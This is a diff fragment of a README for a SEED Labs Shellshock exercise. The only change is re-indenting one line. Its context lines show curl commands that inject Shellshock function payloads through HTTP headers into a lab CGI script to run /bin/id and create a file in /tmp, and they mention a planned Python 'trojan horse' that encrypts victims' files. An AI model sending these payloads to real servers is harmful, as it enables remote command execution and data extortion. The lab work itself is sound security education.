@@ -39,8 +39,7 @@ You can verify in victims terminal by running ```cat /etc/passwd```<br/>
 To get user process id and pid and gpid run ```curl -e "() { echo hello; }; echo Content_type: text/plain; echo; /bin/id" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi```<br/>
 9. We can create a virus folder in victim using ```curl -H "ATTACK: () { echo hello; }; echo Content_type: text/plain; echo; /bin/touch /tmp/virus" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi``` using this folder we will inject our malicious python scripty to encrypt and decrypt users important files. <br/> To check for folder in victims  run ```ls/tmp``` <br/>
 10. Finally we can implement our trojan horse attack using the pyhton script uploaded in my github branch.<br/> 
-
-Close lab container  by ```docker-compose down``` <br/>
+    Close lab container  by ```docker-compose down``` <br/>
 
 - Note:  If you have any concern reach me out and if you want contribute kindly open a pull request.
 
